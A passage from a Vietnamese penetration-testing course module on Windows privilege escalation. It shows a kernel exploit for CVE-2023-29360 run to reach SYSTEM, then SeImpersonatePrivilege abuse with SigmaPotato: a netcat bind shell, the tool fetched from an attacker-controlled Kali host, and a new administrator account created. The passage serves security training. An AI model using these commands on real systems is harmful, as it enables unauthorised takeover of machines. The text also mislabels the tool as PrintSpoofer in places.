Listing 79 cho thấy steve không có bất kỳ privilege đặc biệt nào được gán. Bước tiếp theo của chúng ta là enumerate phiên bản Windows cũng như các security patch đã được cài đặt.

```
PS C:\Users\steve> systeminfo

Host Name:                 CLIENTWK220
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22621 N/A Build 22621
...
PS C:\Users\steve> Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }

Source        Description      HotFixID      InstalledBy          InstalledOn
------        -----------      --------      -----------          -----------
              Security Update  KB5025239                          5/4/2023 12:00:00 AM
              Security Update  KB5025749                          5/4/2023 12:00:00 AM
              Security Update  KB5017233                          9/25/2022 12:00:00 AM
```

                             *Listing 80 - Enumerating phiên bản Windows và các security patch*

Output của Listing 80 cho thấy không có nhiều security update trên phiên bản Windows 22H2 này. Khi xem qua phần Security Vulnerabilities của Microsoft Security Response Center, chúng ta có thể thấy khá nhiều kernel vulnerability có thể dẫn đến việc nâng quyền đang được vá.

Sau nhiều lần tìm kiếm trên internet, chúng ta có thể tìm thấy public exploit code cho CVE-2023-29360. Ngoài việc có sẵn source code, cũng có một phiên bản exploit đã được pre-compiled. Khi xem trên website MSRC chính thức cho lỗ hổng này, chúng ta nhận thấy Microsoft có cung cấp security patch cho lỗ hổng này, cụ thể patch được triển khai dưới dạng KB5027215, vốn không có trên target của chúng ta.

Chúng ta đã có sẵn một phiên bản kernel exploit đã được compile trên virtual machine trong thư mục Desktop của user steve.

```
PS C:\Users\steve> cd .\Desktop\

PS C:\Users\steve\Desktop> dir

    Directory: C:\Users\steve\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          9/3/2024   2:00 AM         157184 CVE-2023-29360.exe
-a----          9/3/2024   1:59 AM           2354 Microsoft Edge.lnk
```

                          *Listing 81 - Xác định vị trí kernel exploit trên Desktop của user steve*

Hãy kiểm tra user hiện tại mà chúng ta đang chạy, sau đó chạy exploit và xem có điều gì thay đổi hay không.

```
PS C:\Users\steve\Desktop> whoami
clientwk220\steve
PS C:\Users\steve\Desktop> .\CVE-2023-29360.exe
[+] Device Description: Microsoft Streaming Service Proxy
Hardware IDs:
        "SW\{96E080C7-143C-11D1-B40F-00A0C9223196}"
[+] Device Instance ID: SW\{96E080C7-143C-11D1-B40F-00A0C9223196}\{3C0D501A-140B-11D1-B40F-00A0C9223196}
[+] First mapped _MDL: 25f9aa00140
[+] Second mapped _MDL: 25f9aa10040
[+] Unprivileged token reference: ffffd1072dde6061
[+] System token reference: ffffd1071de317d5
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\steve\Desktop> whoami
nt authority\system
```

                                                       *Listing 82 - Nâng quyền lên SYSTEM*

Listing 82 cho thấy chúng ta đã nâng quyền thành công bằng cách chạy kernel exploit.

Mặc dù cách exploit hoạt động nằm ngoài phạm vi của module này, nhưng điều quan trọng là phải biết rằng các exploit như vậy chỉ nên được dùng khi source code đi kèm có sẵn để đảm bảo không có hành vi độc hại nào được thực hiện bởi binary. Ngoài ra, kernel exploits nếu được phép sử dụng, sẽ được test trên một bản clone của target trước để đảm bảo hệ thống sẽ không bị crash khi chạy.

Bây giờ khi chúng ta đã thấy một kernel exploit hoạt động, loại vector cuối cùng cho privilege escalation là lạm dụng một số Windows privileges nhất định. Các user không đặc quyền nhưng được gán các privilege, chẳng hạn như SeImpersonatePrivilege, có thể lạm dụng các privilege đó để thực hiện các cuộc tấn công privilege escalation. SeImpersonatePrivilege cung cấp khả năng tận dụng một token với một security context khác. Nghĩa là, một user có privilege này có thể thực hiện các thao tác trong security context của một user account khác trong những điều kiện phù hợp. Theo mặc định, Windows gán privilege này cho các thành viên của local Administrators group cũng như các account LOCAL SERVICE, NETWORK SERVICE, và SERVICE của thiết bị. Microsoft triển khai privilege này để ngăn người dùng không được phép tạo một service hoặc server application nhằm impersonate các client kết nối tới nó. Một ví dụ là Remote Procedure Calls (RPC) hoặc named pipes.

Các privilege khác có thể dẫn đến privilege escalation là SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, và SeDebug. Trong phần này, chúng ta sẽ xem xét kỹ các vector privilege escalation trong bối cảnh của SeImpersonatePrivilege.

Trong các penetration test, chúng ta hiếm khi gặp các standard user có privilege này được gán. Tuy nhiên, chúng ta thường gặp privilege này khi giành được code execution trên một hệ thống Windows bằng cách khai thác một lỗ hổng trong một Internet Information Service (IIS) web server. Trong hầu hết các cấu hình, IIS sẽ chạy dưới LocalService, LocalSystem, NetworkService, hoặc ApplicationPoolIdentity, và tất cả đều được gán SeImpersonatePrivilege. Điều này cũng áp dụng cho các Windows service khác.

Trước khi đi vào ví dụ, hãy thảo luận về named pipes và cách chúng ta có thể sử dụng chúng trong bối cảnh SeImpersonatePrivilege để impersonate một privileged user account.

Named pipes là một phương thức cho Inter-Process Communication cục bộ hoặc từ xa trong Windows. Chúng cung cấp chức năng để hai process không liên quan chia sẻ và truyền dữ liệu với nhau. Một named pipe server có thể tạo một named pipe mà một named pipe client có thể kết nối thông qua tên được chỉ định. Server và client không cần phải nằm trên cùng một hệ thống.

Khi một client kết nối tới một named pipe, server có thể tận dụng SeImpersonatePrivilege để impersonate client đó sau khi bắt được authentication từ quá trình kết nối. Để lạm dụng điều này, chúng ta cần tìm một process có quyền cao và ép nó kết nối tới một named pipe do chúng ta kiểm soát. Khi SeImpersonatePrivilege được gán, chúng ta có thể impersonate user account kết nối tới named pipe và thực hiện các thao tác trong security context của nó.

Trong ví dụ này, chúng ta sẽ sử dụng một tool có tên SigmaPotato, triển khai một biến thể của các potato privilege escalations để ép NT AUTHORITY\SYSTEM kết nối tới một named pipe do chúng ta kiểm soát. Chúng ta có thể sử dụng tool này trong các tình huống mà chúng ta có code execution với tư cách một user có privilege SeImpersonatePrivilege để thực thi lệnh hoặc giành một interactive shell dưới NT AUTHORITY\SYSTEM.

Bây giờ, hãy bắt đầu bằng cách kết nối tới bind shell trên port 4444 trên CLIENTWK220 như chúng ta đã làm ở các phần trước. Chúng ta dùng whoami /priv để hiển thị các privilege được gán cho dave.

```
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

                                          *Listing 83 - Kiểm tra các privilege được gán cho dave*

Listing 83 cho thấy dave có privilege SeImpersonatePrivilege được gán. Do đó, chúng ta có thể thử nâng quyền bằng cách sử dụng PrintSpoofer. Hãy mở một terminal tab khác trên Kali, tải phiên bản 64-bit của tool này, và phục vụ nó bằng một Python3 web server.

```
kali@kali:~$ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
...
2024-09-03 12:50:48 (1.26 MB/s) - 'SigmaPotato.exe' saved [63488/63488]

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

                           *Listing 84 - Tải PrintSpoofer64.exe và phục vụ nó với Python3 web server*

Trong tab terminal có bind shell đang hoạt động, chúng ta sẽ khởi động một PowerShell session và dùng iwr để tải SigmaPotato.exe từ máy Kali của chúng ta.

```
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe
iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe
```

                                              *Listing 85 - Tải SigmaPotato.exe về CLIENTWK220*

Khi sử dụng SigmaPotato.exe, chúng ta có thể thực thi lệnh trong context của NT AUTHORITY\SYSTEM. Chúng ta sẽ dùng lệnh net user để thêm một user mới vào hệ thống và sau đó thêm user đó vào localgroup Administrators.

```
C:\Users\dave> .\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net user dave4 lab /add"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
...
[+] Process Started with PID: 2004

[+] Process Output:
The command completed successfully.

PS C:\Users\dave> net user
net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave                     
dave4                    daveadmin                DefaultAccount           
Guest                    offsec                   steve                    
WDAGUtilityAccount       
The command completed successfully.

PS C:\Users\dave> .\SigmaPotato "net localgroup Administrators dave4 /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
...
[+] Process Started with PID: 10872

[+] Process Output:
The command completed successfully.

PS C:\Users\dave> net localgroup Administrators
net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave4
daveadmin
offsec
The command completed successfully.
```

      *Listing 86 - Sử dụng SigmaPotato tool để thêm một user mới vào Administrators localgroup.*

Listing 86 cho thấy chúng ta đã thực hiện thành công cuộc tấn công privilege escalation và có thể thêm một user mới vào Administrators localgroup. Tuyệt vời!

Mặc dù SigmaPotato cung cấp cho chúng ta một quy trình khai thác đơn giản để nâng quyền, cũng có những tool khác có thể lạm dụng SeImpersonatePrivilege để privilege escalation. Các biến thể thuộc họ Potato (ví dụ RottenPotato, SweetPotato, JuicyPotato hoặc Godpotato) là những tool như vậy. Chúng ta nên dành thời gian để nghiên cứu các tool này.

Hãy tóm tắt nhanh những gì chúng ta đã làm trong phần này. Đầu tiên, chúng ta đã khám phá các loại lỗ hổng khác nhau có thể lạm dụng bằng exploit trong bối cảnh privilege escalation. Sau đó, chúng ta đã thảo luận về privilege SeImpersonatePrivilege và cách sử dụng nó để impersonate các account có quyền cao. Cuối cùng, chúng ta đã sử dụng một tool có tên PrintSpoofer để khai thác privilege này nhằm giành một interactive PowerShell session dưới NT AUTHORITY\SYSTEM.

---

# 4. Tổng kết

---

Trong Module này, chúng ta đã bao quát nhiều phương pháp khác nhau để thực hiện **privilege escalation** trên các hệ thống Windows. Chúng ta bắt đầu bằng việc tìm hiểu cả **kỹ thuật enumerate thủ công và tự động** nhằm xác định thông tin nhạy cảm và xây dựng **situational awareness** cho hệ thống mục tiêu. Sau đó, chúng ta thảo luận **ba phương pháp khác nhau để nâng quyền bằng cách lạm dụng Windows services**. Ở Learning Unit cuối cùng, chúng ta đã khám phá cách **lạm dụng scheduled tasks** và thảo luận về **các loại exploit** có thể dẫn đến privilege escalation.

Những phương pháp được đề cập trong Module này là **một số kỹ thuật phổ biến nhất** để privilege escalation trên Windows. Tuy nhiên, vẫn còn **rất nhiều vector khác** mà chúng ta có thể khai thác để nâng quyền, chẳng hạn như **ghi file với quyền cao (privileged file writes)**. Ngoài ra, privilege escalation là một **lĩnh vực luôn thay đổi**, nơi các vector và lỗ hổng mới liên tục được phát hiện và phát triển.

Dù vậy, trong các penetration test thực tế, chúng ta sẽ gặp những tình huống **không thể nâng quyền thành công** do hệ thống mục tiêu có **security posture tốt** hoặc được bảo vệ bởi **các công nghệ bảo mật hiệu quả**. Trong những trường hợp như vậy, chúng ta nên **vận dụng các phương pháp và kỹ thuật đã học ở những Module khác** để tiếp tục tấn công **các hệ thống hoặc dịch vụ khác** thay vì cố chấp tìm cách privilege escalation trên một mục tiêu không khả thi.

---

# 5. Luyện tập

---

[Windows Fundamentals](https://tryhackme.com/module/windows-fundamentals)

[Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

[DLL HIJACKING](https://tryhackme.com/room/dllhijacking)